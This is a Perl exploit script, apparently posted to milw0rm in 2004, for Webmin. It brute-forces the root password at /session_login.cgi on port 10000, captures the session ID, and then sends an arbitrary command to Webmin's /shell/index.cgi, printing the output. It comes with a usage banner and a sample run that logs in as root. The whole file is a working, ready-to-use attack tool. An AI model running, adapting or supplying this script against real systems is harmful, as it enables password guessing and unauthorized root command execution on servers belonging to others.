#!/usr/bin/perl
##
# Webmin BruteForce + Command execution - By Di42lo <DiAblo_2@012.net.il>
# 
# usage 
# ./bruteforce.webmin.pl <host> <command>
#
#./bruteforce.webmin.pl 192.168.0.5 "uptime"
# [+] BruteForcing...
# [+] trying to enter with: admim
# [+] trying to enter with: admin
# [+] Found SID : f3231ff32849fa0c8c98487ba8c09dbb
# [+] Password : admin
# [+] Connecting to host once again
# [+] Connected.. Sending Buffer
# [+] Buffer sent...running command uptime
# root logged into Webmin 1.170 on linux (SuSE Linux 9.1)
# 10:55pm up 23 days 9:03, 1 user, load average: 0.20, 0.05, 0.01

use IO::Socket;
if (@ARGV<2){ print "Webmin BruteForcer\nusage:\n$0 <host> <command>\n"; exit; }
my $host=$ARGV[0];
my $cmd=$ARGV[1];
#start pass:
my $pass="a";
my $chk=0;
my $sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "10000")
|| die "[-] Webmin on this host does not exist\r\n";
$sock->close;
print "[+] BruteForcing...\n";
my $sid;
while ($chk!=1) {
$pass++;
my $pass_line="page=%2F&user=root&pass=$pass";
my $buffer="POST /session_login.cgi HTTP/1.0\n".
"Host: $host:10000\n".
"Keep-Alive: 300\n".
"Connection: keep-alive\n".
"Referer: http://$host:10000/\n".
"Cookie: testing=1\n".
"Content-Type: application/x-www-form-urlencoded\n".
"Content-Length: __\n".
"\n".
$pass_line."\n\n";
my $line_size=length($pass_line);
$buffer=~s/__/$line_size/g;
my $sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "10000");
if ($sock)
{
print "[+] trying to enter with: $pass\n";
print $sock $buffer;
while ($answer=<$sock>)
{
if ($answer=~/sid=(.*);/g)
{
$chk=1;
$sid=$1;
print "[+] Found SID : $sid\n";
print "[+] Password : $pass\n";
}
}
}
$sock->close;
}
print "[+] Connecting to host once again\n";
$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "10000") ||
die "[-] Cant Connect once again for command execution\n";
print "[+] Connected.. Sending Buffer\n";
my $temp="-----------------------------19777347561180971495777867604\n".
"Content-Disposition: form-data; name=\"cmd\"\n".
"\n".
"$cmd\n".
"-----------------------------19777347561180971495777867604\n".
"Content-Disposition: form-data; name=\"pwd\"\n".
"\n".
"/root\n".
"-----------------------------19777347561180971495777867604\n".
"Content-Disposition: form-data; name=\"history\"\n".
"\n".
"\n".
"-----------------------------19777347561180971495777867604\n".
"Content-Disposition: form-data; name=\"previous\"\n".
"\n".
"$cmd\n".
"-----------------------------19777347561180971495777867604\n".
"Content-Disposition: form-data; name=\"pcmd\"\n".
"\n".
"$cmd\n".
"-----------------------------19777347561180971495777867604--\n\n";
my $buffer_size=length($temp);
$buffer="POST /shell/index.cgi HTTP/1.1\n".
"Host: $host:10000\n".
"Keep-Alive: 300\n".
"Connection: keep-alive\n".
"Referer: http://$host:10000/shell/\n".
"Cookie: sid=$sid\; testing=1; x\n".
"Content-Type: multipart/form-data; boundary=---------------------------19777347561180971495777867604\n".
"Content-Length: siz\n".
"\n".
$temp;
$buffer=~s/siz/$buffer_size/g;
print $sock $buffer;

if ($sock)
{
print "[+] Buffer sent...running command $cmd\n";
print $sock $buffer;

while ($answer=<$sock>)
{
#print $answer;
if ($answer=~/defaultStatus="(.*)";/g) { print $1."\n";}
if ($answer=~/<td><pre><b>&gt;/g)
{
$cmd_chk=1;
}
if ($cmd_chk==1) 
{ 
if ($answer=~/<\/pre><\/td><\/tr>/g)
{
exit;
} else { print $answer; }
}
}
} 

# milw0rm.com [2004-12-22]
